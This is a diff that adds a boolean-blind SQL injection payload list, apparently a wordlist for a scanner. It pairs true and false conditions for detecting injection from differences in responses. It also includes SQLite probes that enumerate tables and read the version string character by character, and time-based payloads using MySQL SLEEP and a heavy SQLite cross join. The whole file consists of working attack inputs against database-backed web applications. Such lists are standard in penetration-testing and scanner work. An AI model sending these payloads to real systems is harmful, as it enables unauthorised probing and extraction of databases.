@@ -1,0 +1,38 @@
+# blind_boolean — boolean blind payloads (true/false condition pairs for diff-based detection)
+# true conditions → same response as baseline
+' AND 1=1--
+' AND 'a'='a
+' AND 1=1 AND '1'='1
+' OR 1=1--
+' AND 2>1--
+' AND LENGTH(database())>0--
+1 AND 1=1--
+1 AND 2>1--
+0 OR 1=1--
+# false conditions → different/empty response
+' AND 1=2--
+' AND 'a'='b
+' AND 1=1 AND '1'='2
+' AND 2<1--
+' AND LENGTH(database())<0--
+1 AND 1=2--
+1 AND 2<1--
+0 OR 1=2--
+# SQLite-specific boolean blind
+' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--
+0 AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--
+' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>99--
+0 AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>99--
+' AND (SELECT LENGTH(sqlite_version()))>1--
+0 AND (SELECT LENGTH(sqlite_version()))>1--
+# substring blind (char-by-char for version first byte)
+' AND SUBSTR(sqlite_version(),1,1)='3'--
+0 AND SUBSTR(sqlite_version(),1,1)='3'--
+' AND SUBSTR(sqlite_version(),1,1)='5'--
+' AND ASCII(SUBSTR(sqlite_version(),1,1))>50--
+# time-based boolean (MySQL)
+' AND IF(1=1,SLEEP(2),0)--
+' AND IF(1=2,SLEEP(2),0)--
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(2),0)--
+# time-based boolean (SQLite — no SLEEP, use heavy query)
+0 AND (SELECT COUNT(*) FROM sqlite_master a,sqlite_master b,sqlite_master c)>0--
